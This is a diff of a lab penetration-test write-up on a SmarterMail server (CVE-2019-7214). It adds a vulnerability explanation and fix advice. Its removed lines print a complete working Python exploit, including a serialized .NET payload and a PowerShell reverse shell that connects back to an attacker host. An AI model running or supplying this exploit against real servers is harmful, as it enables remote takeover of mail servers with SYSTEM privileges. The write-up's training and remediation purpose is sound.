@@ -12,12 +12,45 @@ IP: 192.168.114.65
 
 
 # Resolution summary
-- Located SmarterMail server 
-- Located CVE for SmarterMail 
-- Ran the found CVE python exploit script and received and received a netcat session running as NT Authority System
+- SmarterMail server was located
+- CVE for SmarterMail was located. 
+- Executed the discovered CVE Python Exploit script and obtained a netcat session operating as the NT Authority System.
+  
 ## Used tools
 - Rustscan
 
+### **Vulnerability Explanation:** 
+Title: SmarterMail Remote Code Execution via Deserialization
+Type of Vulnerability: Insecure Deserialization (OWASP Top 10: A8:2017-Insecure Deserialization)
+CWE Reference: CWE-502: Deserialization of Untrusted Data
+Proposal for CVSS Score: 9.8 (Critical)
+
+    CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    This score reflects the vulnerability's critical nature, allowing remote attackers to execute arbitrary code without any user interaction or privileges.
+
+Generic Description:
+
+The vulnerability in question affects SmarterMail, a popular mail server software, specifically in its Build 6985. It allows remote attackers to execute arbitrary code on the server where SmarterMail is installed. This can lead to full system compromise. The vulnerability is due to insecure deserialization of user-supplied content, which can be exploited by an attacker by sending specially crafted serialized objects to the server. When the server deserializes these objects, it can execute arbitrary code in the context of the SmarterMail server.
+Specific Description:
+
+This Remote Code Execution (RCE) vulnerability is specifically caused by the application's failure to securely deserialize user-supplied data. Insecure deserialization vulnerabilities occur when an application deserializes data from untrusted sources without sufficient validation, leading to the execution of malicious code, denial of service, or other attacks. In the case of SmarterMail Build 6985, attackers can exploit this by sending crafted payloads that, when deserialized, execute arbitrary code with the privileges of the SmarterMail service. This could lead to unauthorized access, data leakage, or full system compromise.
+
+### **Vulnerability Fix:** 
+    Patch/Upgrade: The first and most crucial step is to upgrade to the latest version of SmarterMail, where this vulnerability has been fixed. Check the vendor's website for the latest security updates.
+
+    Input Validation: Implement strict input validation to ensure only valid, expected data is processed by the application. This can help mitigate the impact of insecure deserialization vulnerabilities.
+
+    Deserialization Safeguards: Use deserialization mechanisms that allow for the whitelisting of safe classes or the rejection of potentially dangerous classes. Libraries or frameworks that automatically enforce safe deserialization practices should be utilized.
+
+    Regular Security Audits: Conduct regular security audits of your systems and applications to identify and mitigate vulnerabilities. This should include penetration testing and code reviews focused on deserialization vulnerabilities.
+
+    Least Privilege Principle: Run services with the least privileges necessary for functionality. This limits the potential damage from a breach or exploitation of a vulnerability like this one.
+
+    Security Awareness and Training: Educate developers and IT staff on the risks associated with insecure deserialization and other common attack vectors. Promote secure coding practices and the importance of regular updates.
+
+    Monitoring and Anomaly Detection: Implement monitoring and anomaly detection tools to quickly identify unusual activities that could indicate an attack in progress. This can help in early detection and response to security incidents.
+
+By adopting these preventative measures, organizations can significantly reduce the risk associated with the SmarterMail Build 6985 Remote Code Execution vulnerability and enhance their overall security posture against similar threats.
 
 ---
 
@@ -148,25 +181,25 @@ Enumerated top 200 UDP ports:
 # Enumeration
 ## PORT 21
 
-#### - Per NMAP scan we are able to login via anonymous but aren't able to get retrieve the directory listing
+- The scan revealed that the FTP server permitted anonymous login, but the directory listing was unavailable due to a timeout. The HTTP server was running Microsoft IIS 10.0.
 
 ## PORT 9998
 
-#### - Navigate to"http://192.168.114.65:9998'' and get directed to the following login page running Smartermail:
+- When we access "http://192.168.114.65:9998," the following Smartermail login page appears.
 
 ![](Images/Pasted%20image%2020221001115950.png)
 
-#### - Typed "searchsploit smartermail" and found the following remote code execution script:
+- We discover the following remote code execution script when we enter "searchsploit smartermail":
 
 ![](Images/Pasted%20image%2020221001120543.png)
 
-#### - Googled "windows/remote/49216.py" and found the following edb exploit:
+- When we search for "windows/remote/49216.py" on Google, we come across this EDB exploit:
 
 ![](Images/Pasted%20image%2020221001120904.png)
 
 ![](Images/Pasted%20image%2020221001120943.png)
 
-#### - Googled "2019-7214 github" and found the following exploit with better comments for the exploit:
+- When we search for "2019–7214 github" on Google, we find the following exploit with improved comments:
 
 ![](Images/Pasted%20image%2020221001121009.png)
 
@@ -175,66 +208,14 @@ Enumerated top 200 UDP ports:
 
 ---
 
-# Exploitation
-## CVE 2019-7214
+# Exploitation - SmarterMail Build 6985 - Remote Code Execution (CVE-2019-7214)
 
-#### - Added the following script to a python file named exploit.py (changed the IPs as necessary):
+- We download the CVE 2019–7214 script to our Kali machine and save it as exploit.py, updating the IP addresses as necessary.
 
-Exploit Title: SmarterMail Build 6985 - Remote Code Execution
-Exploit Author: 1F98D
-Original Author: Soroush Dalili
-Date: 10 May 2020
-Vendor Hompage: re
-CVE: CVE-2019-7214
-Tested on: Windows 10 x64
-References:
- https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
+- On our Kali machine, we configure a netcat listener on port 17001.
 
-SmarterMail before build 6985 provides a .NET remoting endpoint
-which is vulnerable to a .NET deserialisation attack.
-
-#!/usr/bin/python3
-import base64
-import socket
-import sys
-from struct import pack
-HOST='192.168.84.65'
-PORT=17001 #only this port works?
-LHOST='192.168.49.84'
-LPORT=17001 #only this port works?
-psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
-psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
-psh_shell = base64.b64encode(psh_shell)
-psh_shell = psh_shell.ljust(1360, b' ')
-payload = 'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAPIKL2MgcG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw=='
-payload = base64.b64decode(payload)
-payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
-uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST,PORT)) 
-msg = bytes()
-msg += b'.NET'                 # Header
-msg += b'\x01'                 # Version Major
-msg += b'\x00'                 # Version Minor
-msg += b'\x00\x00'             # Operation Type
-msg += b'\x00\x00'             # Content Distribution
-msg += pack('I', len(payload)) # Data Length
-msg += b'\x04\x00'             # URI Header
-msg += b'\x01'                 # Data Type
-msg += b'\x01'                 # Encoding - UTF8
-msg += pack('I', len(uri))     # URI Length
-msg += uri                     # URI
-msg += b'\x00\x00'             # Terminating Header
-msg += payload                 # Data
-s.send(msg)
-s.close()
-
-#SmarterMailRCEexploit
-
-#### - Setup a listener on port 17001 on kali machine
-
-#### -Typed "python3 exploit.py" on my kali machine and received a reverse shell runing as nt authority\system:
-
+- On our Kali machine, we input "python3 exploit.py" and receive a reverse shell that executes as nt authority\system.
+  
 ![](Images/Pasted%20image%2020221001121328.png)
 
 ---
